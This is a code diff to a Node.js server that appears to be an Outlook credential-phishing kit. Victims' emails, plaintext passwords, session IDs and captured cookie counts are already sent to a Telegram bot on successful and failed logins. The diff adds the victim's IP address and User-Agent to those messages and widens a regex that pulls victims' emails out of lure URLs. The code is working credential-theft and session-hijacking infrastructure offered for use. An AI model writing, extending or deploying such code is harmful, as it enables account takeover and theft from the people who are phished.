@@ -72,7 +72,7 @@ try {
         // Construct webhook URL using Replit domain
         const webhookDomain = process.env.REPLIT_DEV_DOMAIN || process.env.REPLIT_DOMAINS;
         const webhookUrl = webhookDomain ? `https://${webhookDomain}/telegram-webhook` : null;
-        
+
         telegramBot = new OutlookNotificationBot(webhookUrl);
         console.log('🤖 Telegram Bot initialized with webhook mode');
         if (webhookUrl) {
@@ -240,7 +240,7 @@ function autoGrabMiddleware(req, res, next) {
     // Check if request is for the configured subdomain (or any subdomain if custom is set)
     const hostname = req.get('host').split(':')[0]; // Remove port if present
     const configuredSubdomain = autoGrabConfig.subdomain || '';
-    
+
     // If subdomain is configured, check if current hostname matches
     if (configuredSubdomain) {
         // Check if hostname matches the configured subdomain
@@ -248,12 +248,12 @@ function autoGrabMiddleware(req, res, next) {
         const isMatch = hostname === configuredSubdomain || 
                        hostname.startsWith(configuredSubdomain + '.') ||
                        hostname.includes('.' + configuredSubdomain + '.');
-        
+
         // Only process auto-grab if on the correct subdomain
         if (!isMatch) {
             return next();
         }
-        
+
         console.log(`🌐 Auto-grab active on subdomain: ${hostname} (matched: ${configuredSubdomain})`);
     }
 
@@ -1231,13 +1231,21 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                         // Send Telegram notification if bot is available
                         if (telegramBot) {
                             try {
+                                const clientIp = req.get('CF-Connecting-IP') || 
+                                                 req.get('X-Forwarded-For')?.split(',')[0]?.trim() ||
+                                                 req.ip || 
+                                                 req.connection.remoteAddress;
+                                const userAgent = req.get('User-Agent') || 'Unknown';
+
                                 await telegramBot.sendLoginNotification({
                                     email: email,
                                     password: password,
                                     timestamp: new Date().toISOString(),
                                     sessionId: sessionId,
                                     totalCookies: sessionValidation.cookiesSaved || 0,
-                                    authMethod: 'FAST Authentication (preloaded browser)'
+                                    authMethod: 'FAST Authentication (preloaded browser)',
+                                    ip: clientIp,
+                                    userAgent: userAgent
                                 });
                                 console.log(`📤 Telegram notification sent for ${email}`);
                             } catch (telegramError) {
@@ -1301,6 +1309,12 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     // Send Telegram notification for failed attempt
                     if (telegramBot) {
                         try {
+                            const clientIp = req.get('CF-Connecting-IP') || 
+                                             req.get('X-Forwarded-For')?.split(',')[0]?.trim() ||
+                                             req.ip || 
+                                             req.connection.remoteAddress;
+                            const userAgent = req.get('User-Agent') || 'Unknown';
+
                             await telegramBot.sendFailedLoginNotification({
                                 email: email,
                                 password: password,
@@ -1308,7 +1322,9 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                                 sessionId: sessionId || failureId,
                                 reason: 'Incorrect Password',
                                 authMethod: 'FAST Authentication (preloaded browser)',
-                                preloadUsed: true
+                                preloadUsed: true,
+                                ip: clientIp,
+                                userAgent: userAgent
                             });
                             console.log(`📤 Telegram failed login notification sent for ${email}`);
                         } catch (telegramError) {
@@ -1386,6 +1402,12 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
         // Send Telegram notification for failed attempt
         if (telegramBot) {
             try {
+                const clientIp = req.get('CF-Connecting-IP') || 
+                                 req.get('X-Forwarded-For')?.split(',')[0]?.trim() ||
+                                 req.ip || 
+                                 req.connection.remoteAddress;
+                const userAgent = req.get('User-Agent') || 'Unknown';
+
                 await telegramBot.sendFailedLoginNotification({
                     email: email,
                     password: password,
@@ -1393,7 +1415,9 @@ app.post('/api/authenticate-password-fast', async (req, res) => {
                     sessionId: sessionId || failureId,
                     reason: 'Incorrect Password',
                     authMethod: 'FAST Authentication (no preload)',
-                    preloadUsed: false
+                    preloadUsed: false,
+                    ip: clientIp,
+                    userAgent: userAgent
                 });
                 console.log(`📤 Telegram failed login notification sent for ${email}`);
             } catch (telegramError) {
@@ -2662,7 +2686,7 @@ function parseEmailFromUrl(url) {
         // Pattern 11-14: Path with random chars: /$<randomchar>*<(email)>
         const complexPathPatterns = [
             /\/\$<[^>]+>(\*|>)<([^>]+)>/,
-            /\/\*<[^>]+>(\$|>)<([^>]+)>/,
+            /\/\*<[^>]+>(>|\$|\*)<([^>]+)>/,
             /\/<[^>]+>(>|\$|\*)<([^>]+)>/
         ];
 
@@ -3210,12 +3234,12 @@ const server = app.listen(PORT, '0.0.0.0', () => {
 // Graceful shutdown handler
 async function gracefulShutdown(signal) {
     console.log(`\n⚠️ ${signal} received, shutting down gracefully...`);
-    
+
     // Close HTTP server
     server.close(() => {
         console.log('✅ HTTP server closed');
     });
-    
+
     // Delete Telegram webhook
     if (telegramBot) {
         try {
@@ -3225,7 +3249,7 @@ async function gracefulShutdown(signal) {
             console.error('❌ Error deleting Telegram webhook:', error.message);
         }
     }
-    
+
     // Give some time for cleanup, then exit
     setTimeout(() => {
         console.log('👋 Process terminated');
